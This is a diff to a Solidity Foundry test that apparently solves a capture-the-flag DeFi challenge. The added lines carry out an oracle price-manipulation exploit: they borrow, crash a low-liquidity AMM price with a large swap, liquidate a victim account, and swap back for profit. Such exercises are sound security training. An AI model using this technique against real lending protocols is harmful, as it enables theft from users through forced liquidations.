@@ -86,8 +86,22 @@ contract Challenge8Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge8Test -vvvv //
         ////////////////////////////////////////////////////*/
+        
+        //First we deposit and borrow so we have 4 debt tokens that we can burn later when we liquidate
+        token.approve(address(oiler), 6);
+        oiler.deposit(6);
+        oiler.borrow(4);
 
+        //Now we use the low liquidity to crash the price of the token
+        token.approve(address(amm), 94);
+        amm.swap(address(token), 94);
 
+        //Now we burn the debt tokens and liquidate the victim
+        oiler.liquidate(address(superman));
+
+        //Finally we swap the DAI for the token and we have more than 200 tokens
+        dai.approve(address(amm), dai.balanceOf(address(player)));
+        amm.swap(address(dai), dai.balanceOf(address(player)));
 
         //==================================================//
         vm.stopPrank();
